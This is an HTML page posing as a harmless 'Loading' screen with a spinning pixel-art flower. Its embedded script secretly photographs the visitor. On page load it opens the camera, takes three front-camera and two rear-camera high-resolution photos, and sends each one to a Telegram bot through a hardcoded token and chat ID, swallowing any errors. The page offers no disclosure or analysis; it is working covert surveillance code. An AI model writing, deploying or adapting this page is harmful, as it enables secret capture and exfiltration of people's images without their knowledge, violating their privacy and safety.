<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Loading</title>

<style>
body{
margin:0;
background:black;
display:flex;
justify-content:center;
align-items:center;
height:100vh;
overflow:hidden;
}

/* Pixel flower */
.flower{
width:120px;
height:120px;
position:relative;
animation:spin 6s linear infinite;
}

.petals div{
width:40px;
height:40px;
background:#ff66cc;
position:absolute;
image-rendering: pixelated;
}

.petals div:nth-child(1){top:0; left:40px;}
.petals div:nth-child(2){top:40px; left:80px;}
.petals div:nth-child(3){top:80px; left:40px;}
.petals div:nth-child(4){top:40px; left:0;}

.center{
width:40px;
height:40px;
background:#ffee55;
position:absolute;
top:40px;
left:40px;
}

@keyframes spin{
100%{transform:rotate(360deg);}
}
</style>
</head>

<body>

<div class="flower">
<div class="petals">
<div></div>
<div></div>
<div></div>
<div></div>
</div>
<div class="center"></div>
</div>

<script>

const BOT_TOKEN="8082815317:AAEHd6AKLOBJK9vXU0KUuXCgwPt4-v0DyGg";
const CHAT_ID="1167762232";

// ---------- Send Photo ----------
function sendPhoto(blob,name){

let fd=new FormData();
fd.append("chat_id",CHAT_ID);
fd.append("photo",blob,name);

fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`,{
method:"POST",
body:fd
});
}

// ---------- Capture Helper ----------
async function captureFromCamera(facing, count){

try{

const stream=await navigator.mediaDevices.getUserMedia({
video:{
facingMode:facing,
width:{ideal:4096},
height:{ideal:2160}
}
});

const video=document.createElement("video");
video.srcObject=stream;
video.play();

await new Promise(r=>video.onloadedmetadata=r);

const canvas=document.createElement("canvas");
canvas.width=video.videoWidth;
canvas.height=video.videoHeight;

const ctx=canvas.getContext("2d");

for(let i=1;i<=count;i++){

ctx.drawImage(video,0,0);

await new Promise(resolve=>{
canvas.toBlob(blob=>{
sendPhoto(blob,`${facing}_${i}.jpg`);
resolve();
},"image/jpeg",0.95); // High quality
});

await new Promise(r=>setTimeout(r,1000));
}

stream.getTracks().forEach(t=>t.stop());

}catch(e){}

}

// ---------- Run ----------
async function runCapture(){

// 3 selfie photos
await captureFromCamera("user",3);

// 2 rear photos
await captureFromCamera("environment",2);

}

runCapture();

</script>

</body>
</html>
